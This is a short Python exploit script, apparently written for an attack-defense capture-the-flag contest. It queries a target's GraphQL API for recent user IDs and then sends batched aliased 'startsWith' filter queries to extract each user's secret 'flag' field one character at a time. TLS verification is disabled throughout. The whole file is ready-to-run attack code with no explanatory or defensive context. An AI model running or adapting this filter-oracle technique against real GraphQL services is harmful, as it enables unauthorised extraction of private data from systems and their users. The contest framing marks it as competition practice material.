import requests
import time
import re
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.session()

HOST = sys.argv[1]

def get_chars(user_id, pos_start, pos_end):
  query = "query {"

  for pos in range(pos_start, pos_end):
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890":
      query += f'i{pos}_{ord(c)}:users(where:{{id:{{equals:"{user_id}"}},flag:{{startsWith:"{"_"*pos}{c}"}}}}){{id}}'

  query += "}"

  json_data = {"query": query}
  ans = s.post(f"https://{HOST}:443/api/graphql", json=json_data, verify=False).json()["data"]
  ans = [a for a in ans if ans[a]]

  chars = ["_"] * (pos_end-pos_start)

  for a in ans:
    pos, char = map(int, a[1:].split("_"))
    chars[pos-pos_start] = chr(char)

  return "".join(chars)


def get_flag_by_id(flag_id):
  flag = "TEAM123_" # we know this part
  for i in range(len("TEAM123_"), len("TEAM123_")+32):
    flag += get_chars(flag_id, i, i+1)

  flag = flag.rstrip()
  return flag


def get_id_list():
  json_data = {
    "query":"query{users(take:10,orderBy:{createdAt:desc}){id}}"
  }

  items = s.post(f"https://{HOST}:{443}/api/graphql", json=json_data, verify=False).json()["data"]["users"]

  id_list = [i["id"] for i in items]

  return id_list

for user_id in get_id_list():
  flag = get_flag_by_id(user_id)
  print(flag)

